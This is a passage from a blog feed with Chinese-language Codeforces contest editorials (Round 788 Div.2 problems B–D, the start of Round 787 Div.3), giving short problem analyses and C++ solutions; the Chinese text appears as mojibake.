i=<span class="number">2</span>;i&lt;=num_de;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])-<span class="built_in">abs</span>(a[i<span class="number">-1</span>])&gt;<span class="number">0</span>)NO</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=num_de+<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])-<span class="built_in">abs</span>(a[i<span class="number">-1</span>])&lt;<span class="number">0</span>)NO</span><br><span class="line">    &#125;</span><br><span class="line">    OK</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Dorms-War"><a href="#B-Dorms-War" class="headerlink" title="B. Dorms War"></a>B. Dorms War</h2><h3 id="é¢˜ç›®æè¿°ï¼š-1"><a href="#é¢˜ç›®æè¿°ï¼š-1" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜ç›®é¢˜æ„åˆ†æäº†å¾ˆä¹…ï¼Œåé¢çœ‹äº†å¾ˆä¹…æ‰çœ‹å‡ºæ¥ã€‚å°±æ˜¯è¯´ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²å’Œè‹¥å¹²ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œæ¯æ¬¡æ“ä½œä¼šä½¿å¾—ç‰¹æ®Šå­—ç¬¦å‰é¢çš„é‚£ä¸ªå­—ç¬¦æ¶ˆå¤±ï¼Œç›´åˆ°å­—ç¬¦ä¸ä¼šå†æ¶ˆå¤±ä¸ºæ­¢ï¼Œé—®ä½ ä¸€å…±æ¶ˆå¤±å‡ æ¬¡ï¼Œç‰¹æ®Šå­—ç¬¦å¯ä»¥è¢«å‰é¢çš„ç‰¹æ®Šå­—ç¬¦æ¶ˆé™¤ã€‚</p><p>å…¶å®ä¸éš¾å‘ç°ï¼Œä¸€ä¸ªç‰¹æ®Šå­—ç¬¦åå‰é¢å­—ç¬¦çš„æ¬¡æ•°å°±ç›¸å½“äºå®ƒè·ç¦»æœ€è¿‘çš„ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦çš„è·ç¦»+1ã€‚å¤šä¸ªç‰¹æ®Šå­—ç¬¦ä¸å½±å“ç»“æœï¼Œå–æœ€å¤§å³å¯ï¼Œæ˜æ˜æ˜¯ <code>O(n)</code> çš„ç®—æ³•ï¼Œå†™çš„æ—¶é—´å´å¾ˆé«˜ï¼Œç”šè‡³å› æ­¤ <code>T</code> äº†ä¸€æ¬¡ã€‚ä»¥åä¸€å®šè¦è®°å¾— <code>IO</code> ä¼˜åŒ–ï¼Œæ‹’ç» <code>cin</code>ï¼Œä»æˆ‘åšèµ·ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn]; </span><br><span class="line"><span class="keyword">int</span> spec[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="built_in">memset</span>(spec,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(spec));</span><br><span class="line">    string tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line">        cin&gt;&gt;tmp;</span><br><span class="line">        spec[tmp[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(spec[s[i]-<span class="string">&#x27;a&#x27;</span>])&#123;</span><br><span class="line">            ans=<span class="built_in">max</span>(ans,cnt);</span><br><span class="line">            cnt=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Where-is-the-Pizza"><a href="#C-Where-is-the-Pizza" class="headerlink" title="C. Where is the Pizza?"></a>C. Where is the Pizza?</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é€‰æ‹©å…¶ä¸­ä¸€ä¸ªæ•°å¯¼è‡´äº†å¦ä¸€ä¸ªå¿…ç„¶ä¸é€‰ï¼Œæ‰€ä»¥è¿™é‡Œåˆè¦é€‰å¦ä¸€ä¸ªå¿…é€‰çš„æ•°ï¼Œç„¶åå¯¹äºæ¯ä¸ªç¯åªæœ‰ä¸¤ç§æ–¹æ¡ˆï¼Œæ‰¾åˆ°ç¯ä¸ªæ•°ç›¸ä¹˜aå’Œbç”¨æ•£åˆ—ä¿å­˜ä½ç½®ã€‚bæ•°ç»„å…¨éƒ¨æŒ‡å‘aã€‚aæ•°ç»„æŒ‡å‘ è‡ªå·±é‚£ä¸ªå€¼åœ¨ b ä¸­çš„ä½ç½®ã€‚æ¯æ¬¡åˆ¤æ–­ è¿™ä¸ªç¯ä¸­çš„ä½ç½®å¯¹åº”çš„ cæ˜¯å¦å…¨ä¸º0ã€‚æœ€åç‰¹åˆ¤ä¸¤ä¸ªç›¸ç­‰çš„æ—¶å€™è¿™ä¸ªæƒ…å†µä¹Ÿä¸ ä¹˜2ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],a_[maxn],b_[maxn],c[maxn],vis[maxn]; </span><br><span class="line"><span class="keyword">int</span> spec[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(pos);</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> x=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(!vis[x])&#123;</span><br><span class="line">            vis[x]=<span class="number">1</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(b_[a[x]]);</span><br><span class="line">            q.<span class="built_in">push</span>(a_[b[x]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c[x])&#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[x]==b[x])&#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        a_[a[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;b[i];</span><br><span class="line">        b_[b[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;c[i];    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">dfs</span>(i);</span><br><span class="line">            <span class="keyword">if</span>(res)&#123;</span><br><span class="line">                ans*=<span class="number">2</span>;</span><br><span class="line">                ans%=mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Very-Suspicious"><a href="#D-Very-Suspicious" class="headerlink" title="D. Very Suspicious"></a>D. Very Suspicious</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è®¡ç®—å‡ ä½•ï¼Œè‡ªå·±ç”»ä¸€ä¸‹ä¼šå‘ç°ï¼šä¸‰çº¿ç›¸äº¤å¾—åˆ°6ä¸ªï¼Œä¸¤çº¿ç›¸äº¤å¾—åˆ°2ä¸ªï¼Œçº¿åªæœ‰ä¸‰ç§æ–¹å‘ã€‚æ¯æ·»åŠ ä¸€æ¡çº¿å‡‘æˆä¸‰çº¿ç›¸äº¤ï¼Œæ–¹æ¡ˆæ•°+4ï¼Œä¸å…¶å®ƒä¸å¹³è¡Œçš„çº¿ç›¸äº¤ï¼Œæ¯å¤šä¸€ä¸ªæ–¹æ¡ˆæ•°+2ã€‚ç„¶åæ‰“ä¸€éè¡¨ï¼ŒæŠŠ <code>1e9</code> ä»¥å†…çš„ç­”æ¡ˆè·‘å‡ºæ¥æœ€åäºŒåˆ†å¯»æ‰¾ç­”æ¡ˆå³å¯ã€‚</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],a_[maxn],b_[maxn],c[maxn],vis[maxn]; </span><br><span class="line"><span class="keyword">int</span> ans[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> d=<span class="built_in">lower_bound</span>(ans,ans+maxn,n)-ans;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">3</span>]=&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(ans,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(ans));</span><br><span class="line">    ans[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    ans[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    ans[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">    ans[<span class="number">3</span>]=<span class="number">6</span>;</span><br><span class="line">    ans[<span class="number">4</span>]=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span>(;cnt&lt;=<span class="number">1e9</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> sel=i%<span class="number">3</span>;</span><br><span class="line">        cnt+=(num[(sel+<span class="number">1</span>)%<span class="number">3</span>]+num[(sel+<span class="number">2</span>)%<span class="number">3</span>]<span class="number">-2</span>)*<span class="number">2</span>;</span><br><span class="line">        cnt+=<span class="number">4</span>;</span><br><span class="line">        num[sel]++;</span><br><span class="line">        ans[i+<span class="number">1</span>]=cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ³¢ä¹Ÿæ˜¯ä¸Šå¤§åˆ†ï¼Œä¸Šäº†38åˆ†ï¼Œå¸Œæœ›å†æ¥å†å‰ï¼Œäº‰å–å¿«ç‚¹ä¸Šç´«ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1670&quot;&gt;Codeforces Round #788 (Div. 2)&lt;/a&gt;é¢˜è§£ã€‚&lt;/p&gt;
&lt;p&gt;å®å†µåœ¨&lt;a href=&quot;https://www.bilibili.com/video/BV1X3411P7jR?spm_id_from=333.999.0.0&quot;&gt;è¿™é‡Œ&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="é¢˜è§£" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>Codeforces Round 787(Div.3)é¢˜è§£</title>
    <link href="http://example.com/2022/05/06/Codeforces%20Round%20787(Div.3)/"/>
    <id>http://example.com/2022/05/06/Codeforces%20Round%20787(Div.3)/</id>
    <published>2022-05-06T08:00:00.000Z</published>
    <updated>2022-05-07T10:26:30.592Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1675">Codeforces Round #787 (Div. 3)</a> é¢˜è§£æ¥äº†ã€‚</p><p>å®å†µåœ¨<a href="https://www.bilibili.com/video/bv1eF411j7Uz">è¿™é‡Œ</a></p><span id="more"></span><h2 id="A-Food-for-Animals"><a href="#A-Food-for-Animals" class="headerlink" title="A. Food for Animals"></a>A. Food for Animals</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä½ çŒ«ç²®ï¼Œç‹—ç²®å’ŒçŒ«å’Œç‹—éƒ½èƒ½åƒçš„ç²®çš„ä¸ªæ•°ï¼Œå†ç»™ä½ çŒ«ç‹—çš„ä¸ªæ•°ï¼Œé—®èƒ½å¦ä½¿å¾—çŒ«ç‹—éƒ½æœ‰ä¸€ä»½ç²®é£Ÿèƒ½åƒã€‚è¿™é‡Œæˆ‘æ“ä¹‹è¿‡æ€¥ï¼Œå¯¼è‡´WAäº†ä¸€å‘ï¼Œè¡€äºã€‚å°±æ˜¯è¯´ä½ å¯ä»¥å…ˆåˆ¤æ–­ç‹—ç²®æ˜¯å¦å¤Ÿï¼Œå¦‚æœä¸å¤Ÿåˆ™é€šç”¨ç²®é£Ÿå‡å»å‰©ä½™çš„æ•°ç›®ï¼Œç„¶ååœ¨åˆ¤æ–­é€šç”¨ç²®é£Ÿå’ŒçŒ«ç²®æ˜¯å¦å¤§äºç­‰äºçŒ«çš„ä¸ªæ•°å°±è¡Œäº†ï¼Œä½†æ˜¯éå¸¸è¦æ³¨æ„ï¼Œé€šç”¨ç²®é£Ÿçš„ä¸ªæ•°ä¸èƒ½å‡ºç°è´Ÿæ•°ï¼Œå› ä¸ºè¿™é‡Œæ²¡åˆ¤æ–­waäº†ä¸€å‘ï¼Œå¾ˆéš¾ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 